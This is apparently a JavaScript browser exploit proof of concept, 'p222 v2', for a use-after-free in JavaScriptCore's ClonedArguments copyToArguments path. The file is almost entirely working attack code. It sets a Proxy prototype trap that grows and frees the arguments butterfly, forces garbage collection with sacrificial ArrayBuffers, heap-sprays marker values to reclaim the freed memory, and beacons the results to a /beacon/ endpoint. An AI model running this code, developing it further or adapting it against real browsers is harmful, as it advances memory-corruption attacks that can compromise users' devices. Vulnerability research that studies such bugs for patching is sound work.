// p222 — ClonedArguments butterfly UAF v2
//
// Bug: copyToArguments (ClonedArguments.cpp:289) caches butterfly data pointer.
// Proxy trap on hole → grow args → old butterfly freed → loop resumes stale.
//
// v2 fixes from v1 (p221):
//   1. Hole at index 63 (last) — reverse loop gives 63 stale reads (v1 had 5)
//   2. ArrayBuffer sacrifice+GC → fastFree → flushes libpas dealloc log
//   3. ArrayBuffer spray with int32-tagged JSValue markers (full byte control)
//   4. Multiple attempts
//
// copyToArguments loop: for(unsigned i = length; i--;) → processes 63,62,...,1,0
// Hole at 63 = first processed → trap fires → butterfly freed+sprayed
// Then indices 62..0 read from stale pointer = 63 controlled JSValues
//
// Beacon prefix: V222-

(function() {
  'use strict';

  function B(tag, body) {
    var u = '/beacon/V222-' + tag + '?t=' + Date.now();
    try {
      if (body !== undefined) navigator.sendBeacon(u, String(body));
      else new Image().src = u;
    } catch(e) {}
  }

  function hex(v) {
    return ('00000000' + ((v | 0) >>> 0).toString(16)).slice(-8);
  }

  B('BOOT');

  function target() { return arguments; }
  function receiver() { return Array.prototype.slice.call(arguments); }

  var N = 64;
  var HOLE = N - 1;

  // Warmup: verify proxy-on-ClonedArgs reverse loop works
  try {
    var warm = target(1, 2, 3, 4, 5, 6, 7, 8);
    delete warm[7]; // hole at last index
    Object.setPrototypeOf(warm, new Proxy({}, {
      get: function() { return 0xBB; }
    }));
    var wr = receiver.apply(null, warm);
    B('WARM-' + wr.length + '-v7=' + wr[7] + '-v0=' + wr[0]);
  } catch(e) {
    B('WARM-ERR-' + e.message.substring(0, 30));
  }

  for (var att = 0; att < 5; att++) {
    B('A' + att);

    try {
      var argArr = [];
      for (var i = 0; i < N; i++) argArr.push(0x1000 + i);
      var args = target.apply(null, argArr);

      delete args[HOLE];

      var trapFired = false;
      var sprayBufs = [];
      var diagGcRan = false;

      var handler = {
        get: function() {
          if (trapFired) return 77;
          trapFired = true;

          try {
            // STEP A: Grow butterfly → frees original
            // 64→128→256→512 capacity = 3 reallocations = 3 fastFree calls
            for (var g = N; g < 500; g++) args[g] = 0x41;

            // STEP B: Alloc sacrifice ArrayBuffers (backing stores via fastMalloc)
            // Use 128-byte size (different from butterfly to avoid premature reclaim)
            var sacrifice = [];
            for (var s = 0; s < 600; s++) sacrifice.push(new ArrayBuffer(128));
            // Drop all references
            for (var s2 = 0; s2 < sacrifice.length; s2++) sacrifice[s2] = null;
            sacrifice = null;

            // STEP C: GC pressure to collect sacrifice ABs
            // Each collected AB → destructor → fastFree(backing) → dealloc log entry
            // 600 frees > 256 threshold → dealloc log flushes → old butterfly available
            var sentinel = {};
            var wr = new WeakRef(sentinel);
            sentinel = null;

            for (var wave = 0; wave < 4; wave++) {
              var junk = [];
              for (var j = 0; j < 20; j++) {
                var batch = [];
                for (var k = 0; k < 8000; k++) batch.push({w: wave, k: k});
                junk.push(batch);
              }
              junk = null;
            }

            diagGcRan = !wr.deref();

            // STEP D: Spray ArrayBuffers to reclaim freed butterfly
            // Butterfly size: 8 (IndexingHeader) + N*8 = 520 bytes (outOfLineCapacity=0)
            //            or: 32 + 8 + N*8 = 552 bytes (outOfLineCapacity=4)
            // Fill every 8-byte slot with int32-tagged CAFE marker:
            //   hi32 = 0xFFFF0000 (int32 tag)
            //   lo32 = 0xCAFE0000 | slotIndex
            var SIZES = [520, 528, 544, 552, 560, 576];
            sprayBufs = [];
            for (var si = 0; si < SIZES.length; si++) {
              var sz = SIZES[si];
              for (var n = 0; n < 800; n++) {
                var ab = new ArrayBuffer(sz);
                var dv = new DataView(ab);
                for (var off = 0; off + 7 < sz; off += 8) {
                  var slot = off >>> 3;
                  dv.setUint32(off, (0xCAFE0000 | slot) >>> 0, true);
                  dv.setUint32(off + 4, 0xFFFF0000 >>> 0, true);
                }
                sprayBufs.push(ab);
              }
            }
          } catch(ex) {
            B('A' + att + '-TERR-' + (ex.message || '').substring(0, 40));
          }

          return 77;
        }
      };

      Object.setPrototypeOf(args, new Proxy({}, handler));

      var result = receiver.apply(null, args);

      B('A' + att + '-L' + result.length + '-GC' + (diagGcRan ? '1' : '0'));

      var corrupt = 0;
      var cafeHits = 0;
      var hitSlots = [];
      for (var r = 0; r < Math.min(result.length, N); r++) {
        var v = result[r];
        var expected = (r === HOLE) ? 77 : (0x1000 + r);

        if (typeof v === 'number') {
          if (v !== expected) {
            corrupt++;
            var u32 = v >>> 0;
            if ((u32 >>> 16) === 0xCAFE) {
              cafeHits++;
              hitSlots.push(r + ':C' + hex(u32));
            } else {
              hitSlots.push(r + ':' + hex(u32));
            }
          }
        } else if (typeof v === 'object' && v !== null) {
          corrupt++;
          hitSlots.push(r + ':OBJ');
        } else if (v === undefined) {
          corrupt++;
          hitSlots.push(r + ':UND');
        } else {
          corrupt++;
          hitSlots.push(r + ':T' + typeof v);
        }
      }

      B('A' + att + '-C' + corrupt + '-F' + cafeHits);

      if (corrupt > 0) {
        B('A' + att + '-HITS', hitSlots.slice(0, 40).join(' '));

        var raw = [];
        for (var d = 0; d < Math.min(20, result.length); d++) {
          var rv = result[d];
          if (typeof rv === 'number') raw.push(d + '=' + hex(rv));
          else raw.push(d + '=' + typeof rv);
        }
        B('A' + att + '-RAW', raw.join(' '));

        if (cafeHits > 0) {
          B('RECLAIMED');
          var detail = [];
          for (var c = 0; c < Math.min(result.length, N); c++) {
            var cv = result[c];
            if (typeof cv === 'number' && ((cv >>> 16) === 0xCAFE)) {
              detail.push(c + ':' + hex(cv));
            }
          }
          B('CAFE-MAP', detail.join(' '));
        }
        break;
      } else {
        B('A' + att + '-CLEAN');
      }

      sprayBufs = null;
      args = null;
    } catch(e) {
      B('A' + att + '-ERR-' + (e.message || '').substring(0, 50));
    }
  }

  B('DONE');
})();
